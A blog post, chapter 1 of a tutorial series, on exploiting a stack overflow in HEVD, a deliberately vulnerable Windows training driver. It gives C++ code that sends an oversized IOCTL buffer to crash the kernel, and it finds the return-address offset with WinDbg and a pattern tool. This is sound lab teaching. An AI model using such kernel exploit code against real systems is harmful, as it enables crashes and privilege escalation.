@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#ffffff">
+	<meta name="msapplication-TileColor" content="#ffffff">
+<meta itemprop="name" content="[Cracking Windows Kernel with HEVD] Chapter 1: Will this driver ever crash?">
+<meta itemprop="description" content="A beginers guide into a Windows kernel stack overflow vulnerability from zero to advanced bypasses.">
+<meta itemprop="datePublished" content="2022-09-11T00:00:50-03:00" />
+<meta itemprop="dateModified" content="2022-09-11T00:00:50-03:00" />
+<meta itemprop="wordCount" content="1633">
+
+
+
+<meta itemprop="keywords" content="windows,kernel,exploit,stack,overflow,hevd,HEVD,hacksys,extreme,vulnerable,driver,exploitation,smep,kpti,bypass,sysret," /><meta property="og:title" content="[Cracking Windows Kernel with HEVD] Chapter 1: Will this driver ever crash?" />
+<meta property="og:description" content="A beginers guide into a Windows kernel stack overflow vulnerability from zero to advanced bypasses." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mdanilor.github.io/posts/hevd-1/" />
+<meta property="article:published_time" content="2022-09-11T00:00:50-03:00" />
+<meta property="article:modified_time" content="2022-09-11T00:00:50-03:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[Cracking Windows Kernel with HEVD] Chapter 1: Will this driver ever crash?"/>
+<meta name="twitter:description" content="A beginers guide into a Windows kernel stack overflow vulnerability from zero to advanced bypasses."/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>[Cracking Windows Kernel with HEVD] Chapter 1: Will this driver ever crash?</title>
+	<link rel="stylesheet" href="https://mdanilor.github.io/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css" integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin="anonymous">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://mdanilor.github.io">Cebola Security</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					
+				<a href="https://mdanilor.github.io/posts/">Posts</a>
+				<a href="https://mdanilor.github.io/about-hugo/">About</a>
+
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-social hide-in-mobile"><a href="https://github.com/mdanilor" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://mdanilor.github.io/posts/">Posts</a></li>
+			<li><a href="https://mdanilor.github.io/about-hugo/">About</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster">
+		<article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>Sep 11, 2022</span></div>
+				<h1>[Cracking Windows Kernel with HEVD] Chapter 1: Will this driver ever crash?</h1>
+			</header>
+			<div class="content">
+				<h2 id="cracking-hacksys-extreme-vulnerable-driver-will-this-driver-ever-crash">Cracking HackSys Extreme Vulnerable Driver: will this driver ever crash?<a href="#cracking-hacksys-extreme-vulnerable-driver-will-this-driver-ever-crash" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<h3 id="writing-a-bsod-crash">Writing a BSOD crash<a href="#writing-a-bsod-crash" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p><a href="/posts/hevd-0/">Last time</a> we focused on setting up the environment. This time we will try to understand the vulnerability and make our system crash! Let&rsquo;s dive in!</p>
+<h4 id="the-vulnerable-code">The vulnerable code<a href="#the-vulnerable-code" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<pre><code>(...)
+    	ULONG KernelBuffer[BUFFER_SIZE] = { 0 };
+(...)
+        // Verify if the buffer resides in user mode
+        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));
+
+        DbgPrint(&quot;[+] UserBuffer: 0x%p\n&quot;, UserBuffer);
+        DbgPrint(&quot;[+] UserBuffer Size: 0x%zX\n&quot;, Size);
+        DbgPrint(&quot;[+] KernelBuffer: 0x%p\n&quot;, &amp;KernelBuffer);
+        DbgPrint(&quot;[+] KernelBuffer Size: 0x%zX\n&quot;, sizeof(KernelBuffer));
+
+(...)
+
+        DbgPrint(&quot;[+] Triggering Buffer Overflow in Stack\n&quot;);
+
+        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
+        // because the developer is passing the user supplied size directly to
+        // RtlCopyMemory()/memcpy() without validating if the size is greater or
+        // equal to the size of KernelBuffer
+
+        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
+(...)
+</code></pre><p>The comments pretty much explain the whole code. The issue arises on <code>RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);</code>, as it copies <code>Size</code> bytes, where <code>Size</code> is a user-defined length, from a user buffer to a kernel buffer of size <code>BUFFER_SIZE</code>. <code>BUFFER_SIZE</code> is defined in <code>Common.h</code> as 512. ULONG is 4 bytes long, thus <code>KernelBuffer</code> size is 2048 bytes. If the user sends a buffer larger than 2048, it will overflow.</p>
+<p>If you are new to stack overflow vulnerabilities, you might be asking yourself &ldquo;but how does a stack overflow can turn into elevation of privileges or arbitrary code execution?&quot;. That is a very valid concern and I will not go in depth here, as I have already explained in a previous post. You can read about it <a href="https://mdanilor.github.io/posts/hello-kernel/#the-stack">here</a>.</p>
+<h4 id="lets-write-some-code">Let&rsquo;s write some code<a href="#lets-write-some-code" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<p>Fire up your Visual Studio and create an empty C++ project.</p>
+<p>First thing we have to do is find a way to communicate with our device driver. Device drivers can be accessed through Input Output Control (IOCTL), in which a userland application may call for functions implemented by the driver. Each IOCTL function implemented by the driver is assigned to a numeric identificator. Moreover, HEVD implements one IOCTL function for each vulnerability. This means that we have to know which IOCTL function number to &ldquo;call&rdquo; and reach the stack overflow vulnerability. For that, we can check the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h">code</a> out:</p>
+<pre><code>(...)
+
+#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)
+#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      IOCTL(0x801)
+#define HEVD_IOCTL_ARBITRARY_WRITE                               IOCTL(0x802)
+#define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL                IOCTL(0x803)
+#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL            IOCTL(0x804)
+#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL                 IOCTL(0x805)
+#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL                IOCTL(0x806)
+(...)
+</code></pre><p>As we can see, the buffer overflow stack is IOCTL function number 0x800.</p>
+<p>To use the IOCTL and call the buffer overflow stack function, we must get the handle for the device driver. Windows&rsquo; CreateFileA function, besides creating new files, opens handles for devices. Check the <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea?redirectedfrom=MSDN">doc page</a> for further information.</p>
+<p>So first let&rsquo;s write a function that gets the handle for the device:</p>
+<pre><code>#include &lt;iostream&gt;
+#include &lt;string&gt;
+#include &lt;Windows.h&gt;
+
+#define DEVICE_NAME	&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;
+#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) // Gets the IOCTL number from the function number
+#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)
+
+using namespace std;
+
+HANDLE get_handle() {
+	HANDLE h = CreateFileA(DEVICE_NAME,
+		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+		FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL,
+		OPEN_EXISTING,
+		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+		NULL);
+
+	if (h == INVALID_HANDLE_VALUE) {
+		printf(&quot;Failed to get handle =(\n&quot;);
+		return NULL;
+	}
+	return h;
+}
+</code></pre><p>The <code>get_handle()</code> function gets the handle (duh) to the device and returns it, in case of success. It calls CreateFileA function to do that, which parameters are covered below:</p>
+<ul>
+<li>File name - <code>DEVICE_NAME</code>: this is the name of the device to get the handle. The device name is <code>\\.\HackSysExtremeVulnerableDriver</code>, which is described in the driver source code. These weird extra <code>\</code> occur to correctly and safely convert to type <code>LPCSTR</code>, accepted by <code>CreateFileA()</code> function.</li>
+<li>Desired access - <code>FILE_READ_ACCESS | FILE_WRITE_ACCESS</code>: define which types of access we desire upon manipulating this file. It can be read, write or both, basically. Here we have chosen both.</li>
+<li>Shared mode - <code>FILE_SHARE_READ | FILE_SHARE_WRITE</code>: allows or disallows the file to be opened by other applications. In this case, we do not care too much about this right now. However, in specific scenarios, such as race condition, we might need to get more than one handle to the device.</li>
+<li>Security Attributes - <code>NULL</code>: this optional parameter regards to a few security attributes on the moment of opening the file. It is mostly used to allow handles to be inherited to other processes. In this case, we do not care about that.</li>
+<li>Creation disposition - <code>OPEN_EXISTING</code>: action to take when the desired file does not exist. With <code>OPEN_EXISTING</code>, it will raise an error should if the file does not exist. It is usual to use this when working with device drivers.</li>
+<li>Flags and attributes - <code>FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL</code>: as the name states, flags and attributes when opening this file. In this case, we are signaling that the file will be used for asynchronous IO.</li>
+<li>Template file - <code>NULL</code>: ignored when opening an existing file, so NULL here.</li>
+</ul>
+<p>We create and use the <code>IOCTL</code> macro, which utilizes <code>CTL_CODE</code> macro. This macro will not be explained here, but you can read the official documentation <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code">here</a>.</p>
+<p>Now we can do IOCTL just by calling <code>DeviceIoControl()</code> function. I will create a simple <code>do_buffer_overflow()</code> function now that will call the IOCTL sending a 0x1000 byte long buffer that will surely overflow the driver and we&rsquo;ll go on from that.</p>
+<pre><code>void do_buffer_overflow(HANDLE h)
+{
+	SIZE_T in_buffer_size = 0x1000;
+	PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
+	memset((char *)in_buffer, 'A', in_buffer_size);
+	printf(&quot;Sending buffer.\n&quot;);
+	bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
+	if (!result)
+	{
+		printf(&quot;IOCTL Failed: %X\n&quot;, GetLastError());
+	}
+	HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
+}
+</code></pre><p>What this does is allocate a buffer of size 0x1000 (4096) bytes, which overflows the 2048 byte-long KernelBuffer. Wrapping it up, this is our code:</p>
+<pre><code>#include &lt;iostream&gt;
+#include &lt;string&gt;
+#include &lt;Windows.h&gt;
+
+#define DEVICE_NAME	&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;
+#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)
+
+using namespace std;
+
+
+HANDLE get_handle() {
+	HANDLE h = CreateFileA(DEVICE_NAME,
+		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+		FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL,
+		OPEN_EXISTING,
+		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+		NULL);
+
+	if (h == INVALID_HANDLE_VALUE) {
+		printf(&quot;Failed to get handle =(\n&quot;);
+		return NULL;
+	}
+	return h;
+}
+
+void do_buffer_overflow(HANDLE h)
+{
+	SIZE_T in_buffer_size = 0x1000;
+	PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
+	memset((char *)in_buffer, 'A', in_buffer_size);
+	printf(&quot;Sending buffer.\n&quot;);
+	bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
+	if (!result)
+	{
+		printf(&quot;IOCTL Failed: %X\n&quot;, GetLastError());
+	}
+	HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
+}
+
+int main()
+{
+	do_buffer_overflow(get_handle());
+	system(&quot;pause&quot;);
+}
+</code></pre><p>Now let&rsquo;s put a breakpoint in HEVD function <code>TriggerBufferOverflowStack()</code> and run the exploit. Follow the steps below:</p>
+<ul>
+<li>Pause the execution on WinDbg.</li>
+<li>On the Command window, find the function by typing <code>x HEVD!TriggerBufferOverflowStack</code>. Click on the function.</li>
+<li>Click the link to the source code. The disassembly of the function will open in the Disassembly window.
+<img src="/posts/kernel2-img/7-breakpoint1.png" alt=""></li>
+<li>Navigate your way to the end of the function and put a breakpoint in the RET instruction. (Click the instruction and press F9 to insert a breakpoint)
+<img src="/posts/kernel2-img/8-breakpoint2.png" alt=""></li>
+<li>Resume execution (F5)</li>
+<li>Run the exploit</li>
+</ul>
+<p>The breakpoint hits! Aw yeah!</p>
+<p>I use the Memory window to check the stack out by puting <code>@rsp</code> in the &ldquo;Virtual&rdquo; and everything is &lsquo;A&rsquo;.</p>
+<p><img src="/posts/kernel2-img/9-as.png" alt=""></p>
+<p>If we continue, the machine crashes. Mission acomplished. Next step: overwrite the return address.</p>
+<h3 id="execution-flow-hijack">Execution flow hijack<a href="#execution-flow-hijack" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>We have already overwritten the return address to <code>AAAAAAAA</code>. Cool, but <code>0x4141414141414141</code> does not mean any valid address we can execute. We need to find out where exactly in our buffer the return address gets overwritten and replace it with a valid executable address. To which valid executable address we will redirect the execution will come up later on. What we need now is an offset.</p>
+<p>There are two ways to determine the offset for the return address. One way is to analyze the assembly code with WinDBG. The other is to use <a href="https://github.com/ickerwx/pattern">pattern</a>.</p>
+<h4 id="offset-discovery-with-windbg">Offset discovery with WinDBG<a href="#offset-discovery-with-windbg" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<p>This method is pretty straightforward. If we look at the assembly code of the epilogue of the <code>hevd!TriggerBufferOverflowStack</code> function on WinDBG, we get this:</p>
+<p><img src="/posts/kernel2-img/10-functionepilogue.png" alt=""></p>
+<p>As we can see, it pops 3 64-bit (8 bytes) registers before it calls RET. If we peek at the HEVD source code, we find out the buffer has 2048 bytes. 2048 + 3*8 = 2072 and that is our buffer size.</p>
+<p>This method requires some extra manual evaluation and the visual inspection may be prone to human error, so there is a more assertive way shown next.</p>
+<h4 id="offset-discovery-with-pattern">Offset discovery with pattern<a href="#offset-discovery-with-pattern" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<p>This approach is usually error free. First we use <a href="https://github.com/ickerwx/pattern">pattern</a> to create a pattern (duh) that will go in the buffer.</p>
+<p><code>pattern.py create 2100</code> will generate a 2100 byte long pattern to our buffer. It should look like this:</p>
+<p><img src="/posts/kernel2-img/11-patterncreate.png" alt=""></p>
+<p>These weird characters will be used to find out the offset. We will send this pattern in our buffer and use the same tool to find out which offset of the pattern reached to the instruction pointer.</p>
+<p>The code gets like this:</p>
+<pre><code>void do_buffer_overflow(HANDLE h)
+{
+	SIZE_T in_buffer_size = 2100;
+	PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
+	in_buffer = (PULONG) &quot;&lt;GENERATED_PATTERN_HERE&gt;&quot;
+	
+	printf(&quot;Sending buffer.\n&quot;);
+	bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
+	if (!result)
+	{
+		printf(&quot;IOCTL Failed: %X\n&quot;, GetLastError());
+	}
+	HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
+}
+</code></pre><p>Now set up a breakpoint in <code>hevd!TriggerBufferOverflowStack</code>'s <code>ret</code> instruction and let us see the results.</p>
+<p>As soon as the breakpoint hits, which is just before the <code>ret</code> instruction executes, we peek at the memory (make sure to set up display format as ASCII) and check the top of the stack out:</p>
+<p><img src="/posts/kernel2-img/12-patterninstack.png" alt=""></p>
+<p>In my case, I have <code>0Cr1</code> at the top of my stack. So I&rsquo;ll run <a href="https://github.com/ickerwx/pattern">pattern</a>: <code>pattern.py offset 0Cr1 2100</code>, where <code>0Cr1</code> is the pattern for which I want the offset and 2100 is the size of the generated buffer. And the result is 2072:</p>
+<p><img src="/posts/kernel2-img/13-patteroffset.png" alt=""></p>
+<p>That way, we must put the return address in the position 2072 of our payload. This will redirect the execution flow to whatever address we put in this position. But this raises the next question: where do we redirect the execution flow to? Unfortunately, this question will be answered on the next part! See you then!</p>
+
+			</div>
+			<hr class="post-end">
+			<footer class="post-info">
+				<p>
+					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://mdanilor.github.io/tags/windows">windows</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/kernel">kernel</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/exploit">exploit</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/stack">stack</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/overflow">overflow</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/hevd">hevd</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/hevd">HEVD</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/hacksys">hacksys</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/extreme">extreme</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/vulnerable">vulnerable</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/driver">driver</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/exploitation">exploitation</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/smep">smep</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/kpti">kpti</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/bypass">bypass</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/sysret">sysret</a></span>
+				</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1633 Words</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2022-09-11 00:00 -0300</p>
+			</footer>
+		</article>
+		<div class="post-nav thin">
+			<a class="prev-post" href="https://mdanilor.github.io/posts/hevd-0/">
+				<span class="post-nav-label">Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>[Cracking Windows Kernel with HEVD] Chapter 0: Where do I start?</span>
+			</a>
+		</div>
+		<div id="comments" class="thin">
+</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2022 <a href="https://mdanilor.github.io">Danilo &#34;mdanilor&#34; Rodrigues</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://mdanilor.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+
+	<script src="https://mdanilor.github.io/js/bundle.min.4a9a0ac3d2217822c7865b4161e6c2a71de1d70492264337755427898dd718f6.js" integrity="sha256-SpoKw9IheCLHhltBYebCpx3h1wSSJkM3dVQniY3XGPY=" crossorigin="anonymous"></script>
+	
+
+</body>
+
+</html>
